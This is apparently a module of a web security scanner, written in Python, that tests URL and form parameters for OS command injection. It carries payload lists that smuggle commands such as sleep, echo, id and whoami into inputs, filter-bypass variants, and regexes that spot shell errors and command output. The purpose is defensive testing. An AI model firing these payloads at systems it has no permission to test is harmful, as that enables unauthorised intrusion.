"""Command Injection scanner — OS command injection detection (Linux + Windows)."""

import re
import asyncio
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from datetime import datetime, timezone
from typing import Optional

from .config import Finding, Severity, FindingType, ScanConfig
from .http_client import HttpClient


# Time-based command injection payloads
TIME_PAYLOADS_LINUX = [
    "; sleep 5",
    "| sleep 5",
    "& sleep 5",
    "&& sleep 5",
    "|| sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    "\nsleep 5",
    ";sleep 5",
    "|sleep 5",
]

TIME_PAYLOADS_WINDOWS = [
    "; timeout 5",
    "| timeout 5",
    "& timeout 5",
    "&& timeout 5",
    "|| timeout 5",
    "\ntimeout 5",
]

# Error-based detection patterns
CMDI_ERROR_PATTERNS = [
    (r"/bin/sh:.*?:", "Linux shell error"),
    (r"sh:.*?: not found", "Linux shell not found"),
    (r"bash:.*?:", "Bash error"),
    (r"cmd\.exe", "Windows cmd detected"),
    (r"'[^']*' is not recognized", "Windows command error"),
    (r"Access is denied", "Windows access denied"),
    (r"InvalidOperationException", ".NET error"),
    (r"java\.io\.IOException", "Java IO error"),
    (r"java\.lang\.Runtime", "Java Runtime exec"),
    (r"Traceback.*?subprocess", "Python subprocess error"),
]

# Output-based payloads (try to trigger identifiable output)
OUTPUT_PAYLOADS = [
    "; echo CMDI_WEBBREAKER_7341",
    "| echo CMDI_WEBBREAKER_7341",
    "& echo CMDI_WEBBREAKER_7341",
    "&& echo CMDI_WEBBREAKER_7341",
    "|id",
    ";id",
    "&id",
    "; whoami",
    "| whoami",
    "& whoami",
    "$(echo CMDI_WEBBREAKER_7341)",
    "`echo CMDI_WEBBREAKER_7341`",
]

# Filter bypass payloads
BYPASS_PAYLOADS = [
    "; ec''ho CMDI_WEBBREAKER_7341",
    "| ec''ho CMDI_WEBBREAKER_7341",
    "; ec\ho CMDI_WEBBREAKER_7341",
    "; ec%00ho CMDI_WEBBREAKER_7341",
    "|cmd /c echo CMDI_WEBBREAKER_7341",
    ";printf 'CMDI_WEBBREAKER_7341'",
    "|ping -c 1 127.0.0.1",
    "%0aecho CMDI_WEBBREAKER_7341",
    "%0decho CMDI_WEBBREAKER_7341",
]

MARKER = "CMDI_WEBBREAKER_7341"


class CmdiScanner:
    """OS Command Injection detection."""

    def __init__(self, config: ScanConfig):
        self.config = config
        self.client = HttpClient(config)
        self.findings: list[Finding] = []

    def _check_error_patterns(self, text: str) -> Optional[tuple[str, str]]:
        for pattern, desc in CMDI_ERROR_PATTERNS:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return desc, match.group(0)
        return None

    def _check_output_marker(self, text: str) -> bool:
        return MARKER in text

    def _check_command_output(self, text: str) -> Optional[str]:
        """Check for common command output patterns."""
        patterns = [
            (r"uid=\d+\([^)]+\)\s+gid=\d+", "id command output"),
            (r"root:.*:0:0:", "/etc/passwd or id output"),
            (r"www-data|nobody|apache|nginx", "common web server user"),
            (r"Administrator|SYSTEM", "Windows user"),
        ]
        for pattern, desc in patterns:
            if re.search(pattern, text):
                return desc
        return None

    async def scan_param(self, url: str, param: str, method: str = "GET") -> list[Finding]:
        """Test a parameter for command injection."""
        findings = []
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        original_value = params_dict.get(param, [""])[0]

        # 1. Time-based detection
        for payload in TIME_PAYLOADS_LINUX:
            test_value = original_value + payload
            if method == "GET":
                tp = dict(params_dict)
                tp[param] = [test_value]
                test_url = urlunparse(parsed._replace(query=urlencode(tp, doseq=True)))
                start = time.monotonic()
                resp = await self.client.get(test_url)
                elapsed = time.monotonic() - start
            else:
                start = time.monotonic()
                resp = await self.client.post(url, data={param: test_value})
                elapsed = time.monotonic() - start

            if resp and elapsed >= 4.5:
                findings.append(Finding(
                    finding_type=FindingType.CMDI,
                    severity=Severity.CRITICAL,
                    url=url, parameter=param, payload=payload,
                    evidence=f"Time-based: response took {elapsed:.2f}s (expected <2s)",
                    remediation="Never pass user input to OS commands. Use language-native APIs instead.",
                    confidence=0.85,
                    timestamp=datetime.now(timezone.utc).isoformat(),
                ))
                break

        # 2. Output-based detection
        if not findings:
            for payload in OUTPUT_PAYLOADS:
                test_value = original_value + payload
                if method == "GET":
                    tp = dict(params_dict)
                    tp[param] = [test_value]
                    test_url = urlunparse(parsed._replace(query=urlencode(tp, doseq=True)))
                    resp = await self.client.get(test_url)
                else:
                    resp = await self.client.post(url, data={param: test_value})

                if not resp:
                    continue

                if self._check_output_marker(resp.text):
                    findings.append(Finding(
                        finding_type=FindingType.CMDI,
                        severity=Severity.CRITICAL,
                        url=url, parameter=param, payload=payload,
                        evidence=f"Output marker '{MARKER}' found in response",
                        remediation="Never pass user input to OS commands. Use allowlisted commands only.",
                        confidence=0.95,
                        timestamp=datetime.now(timezone.utc).isoformat(),
                    ))
                    break

                cmd_output = self._check_command_output(resp.text)
                if cmd_output:
                    findings.append(Finding(
                        finding_type=FindingType.CMDI,
                        severity=Severity.CRITICAL,
                        url=url, parameter=param, payload=payload,
                        evidence=f"Command output detected: {cmd_output}",
                        remediation="Never pass user input to OS commands. Use language-native APIs.",
                        confidence=0.9,
                        timestamp=datetime.now(timezone.utc).isoformat(),
                    ))
                    break

        # 3. Error-based detection
        if not findings:
            for payload in OUTPUT_PAYLOADS[:5]:
                test_value = original_value + payload
                if method == "GET":
                    tp = dict(params_dict)
                    tp[param] = [test_value]
                    test_url = urlunparse(parsed._replace(query=urlencode(tp, doseq=True)))
                    resp = await self.client.get(test_url)
                else:
                    resp = await self.client.post(url, data={param: test_value})

                if not resp:
                    continue

                error = self._check_error_patterns(resp.text)
                if error:
                    findings.append(Finding(
                        finding_type=FindingType.CMDI,
                        severity=Severity.HIGH,
                        url=url, parameter=param, payload=payload,
                        evidence=f"Error-based: {error[0]} — {error[1]}",
                        remediation="Never pass user input to OS commands. Validate and sanitize all input.",
                        confidence=0.8,
                        timestamp=datetime.now(timezone.utc).isoformat(),
                    ))
                    break

        # 4. Filter bypass attempts
        if not findings:
            for payload in BYPASS_PAYLOADS[:4]:
                test_value = original_value + payload
                if method == "GET":
                    tp = dict(params_dict)
                    tp[param] = [test_value]
                    test_url = urlunparse(parsed._replace(query=urlencode(tp, doseq=True)))
                    resp = await self.client.get(test_url)
                else:
                    resp = await self.client.post(url, data={param: test_value})

                if resp and (self._check_output_marker(resp.text) or self._check_error_patterns(resp.text)):
                    evidence = "Marker found" if self._check_output_marker(resp.text) else f"Error: {self._check_error_patterns(resp.text)[1]}"
                    findings.append(Finding(
                        finding_type=FindingType.CMDI,
                        severity=Severity.HIGH,
                        url=url, parameter=param, payload=f"[bypass] {payload}",
                        evidence=f"Filter bypass: {evidence}",
                        remediation="Fix underlying injection AND improve input filtering. Use allowlists.",
                        confidence=0.75,
                        timestamp=datetime.now(timezone.utc).isoformat(),
                    ))
                    break

        self.findings.extend(findings)
        return findings

    async def scan_url(self, url: str, params: list[dict] = None) -> list[Finding]:
        all_findings = []
        if params:
            for p in params:
                findings = await self.scan_param(url, p["name"])
                all_findings.extend(findings)
        else:
            parsed = urlparse(url)
            for param_name in parse_qs(parsed.query).keys():
                findings = await self.scan_param(url, param_name)
                all_findings.extend(findings)
        return all_findings

    async def scan_forms(self, forms: list[dict]) -> list[Finding]:
        all_findings = []
        for form in forms:
            for field in form["fields"]:
                if field["type"] in ("hidden", "submit", "button"):
                    continue
                findings = await self.scan_param(form["action"], field["name"], method=form["method"])
                all_findings.extend(findings)
        return all_findings

    async def close(self):
        await self.client.close()